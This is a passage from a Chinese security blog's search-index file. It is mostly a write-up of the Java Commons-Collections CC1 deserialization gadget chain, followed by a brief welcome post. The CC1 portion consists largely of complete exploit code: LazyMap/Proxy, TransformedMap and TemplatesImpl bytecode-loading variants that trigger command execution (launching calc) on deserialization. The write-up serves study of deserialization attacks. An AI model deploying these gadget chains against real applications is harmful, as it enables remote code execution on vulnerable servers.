class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object,Object&gt;hashmap=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map decorateMap= LazyMap.decorate(hashmap,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        InvocationHandler annotationinvocationhandler=(InvocationHandler) constructor.newInstance(Override.class,decorateMap);</span><br><span class="line">        Map proxymap=(Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationinvocationhandler);</span><br><span class="line">        annotationinvocationhandler=(InvocationHandler)constructor.newInstance(Override.class,proxymap);</span><br><span class="line">        serialize(annotationinvocationhandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span><span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(Files.newOutputStream(Paths.get(<span class="string">&quot;ser.bin&quot;</span>)));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String name)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(Files.newInputStream(Paths.get(name)));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241110214009583.png" class="" title="This is an example image"><h2 id="链子整理"><a href="#链子整理" class="headerlink" title="链子整理"></a>链子整理</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">调用链</span><br><span class="line">Invokertransformer#transform</span><br><span class="line">LazyMap#get</span><br><span class="line">Annotationinvocationhandler#readObject</span><br><span class="line"></span><br><span class="line">辅助链</span><br><span class="line">ChainedTransformer</span><br><span class="line">ConstantTransformer</span><br><span class="line">HashMap</span><br><span class="line">Map(Proxy)#entrySet</span><br></pre></td></tr></table></figure><p>这里直接借用别人的流程图吧</p><p><img src="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/CC1LazyMap.png" alt="img"></p><h1 id="CC1-链的-TemplatesImpl-的实现方式"><a href="#CC1-链的-TemplatesImpl-的实现方式" class="headerlink" title="CC1 链的 TemplatesImpl 的实现方式"></a>CC1 链的 TemplatesImpl 的实现方式</h1><p>cc3中得到的思路</p><blockquote><p>TemplatesImpl 只是将原本的命令执行变成代码执行的方式所以在不考虑黑名单的情况下，如果可以进行命令执行，则一定可以通过动态加载字节码进行代码执行。</p></blockquote><ul><li>如图，链子不变，只是最后的命令执行方式变了。</li></ul><p><img src="https://drun1baby.top/2022/06/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8704-CC3%E9%93%BE/Diff.png" alt="img"></p><p>所以这里我们先尝试修改命令执行的方法，这时候的链子应该是从后往前的，也就是确定了命令执行的方式之后，将传参设置为动态加载的字节码。并且前面的链子不变。</p><p>暂时的 EXP 是这样的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        chainedTransformer.transform(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最后一句，传入 <code>chainedTransformer.transform(1)</code> 是因为前面我们定义了 <code>new ConstantTransformer(templates)</code>，这个类是需要我们传参的，传入 1 即可。</p><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130145213179.png" class="" title="This is an example image"><ul><li>OK，弹计算器成功，接下来是把 CC1 链的前半部分拿进去。</li></ul><p>完整的 EXP 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">templatesImpldynamicclass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        TemplatesImpl templates=<span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class templateClass=templates.getClass();</span><br><span class="line">        Field nameField=templateClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Field bytecodesfield=templateClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil= Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes=&#123;evil&#125;;</span><br><span class="line">        bytecodesfield.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        Field tfactoryfield=templateClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryfield.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=<span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(1);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;value&quot;</span>);<span class="comment">//这里是问题二中改键值对的值为注解中成员变量的名称，通过if判断</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedmap= TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line">        Class c=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor constructor=c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        Object o=constructor.newInstance(Target.class,transformedmap);<span class="comment">//这里是问题二中第一个参数改注解为Target</span></span><br><span class="line">        serialize(o);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150406600.png" class="" title="This is an example image"><ul><li>然后是 Yso 正版链子的 TemplatesImpl 的实现方式。</li></ul><p>EXP 如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ysotemplate</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">templatesClass</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates, <span class="string">&quot;Meteor&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\code\\calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;evil&#125;;</span><br><span class="line">        bytecodesField.set(templates, codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactoryField</span> <span class="operator">=</span> templatesClass.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactoryField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactoryField.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        <span class="comment">//     templates.newTransformer();</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates), <span class="comment">// 构造 setValue 的可控参数</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">decorateMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">declaredConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">invocationHandler</span> <span class="operator">=</span> (InvocationHandler) declaredConstructor.newInstance(Override.class, decorateMap);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader()</span><br><span class="line">                , <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);</span><br><span class="line">        invocationHandler = (InvocationHandler) declaredConstructor.newInstance(Override.class, proxyMap);</span><br><span class="line"></span><br><span class="line">        serialize(invocationHandler);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="/2024/12/26/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96CC1%E9%93%BE%E5%88%86%E6%9E%90/image-20241130150715540.png" class="" title="This is an example image">]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新博客啦啦啦</title>
      <link href="/2024/12/26/hello-world/"/>
      <url>/2024/12/26/hello-world/</url>
      
        <content type="html"><![CDATA[<p>欢迎来到Meteor_Kai的暗黑系博客，一直觉得很帅，今天也是换上了，嘻嘻。</p><p>欢迎大师傅们交流哦，联系方式见About Me。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
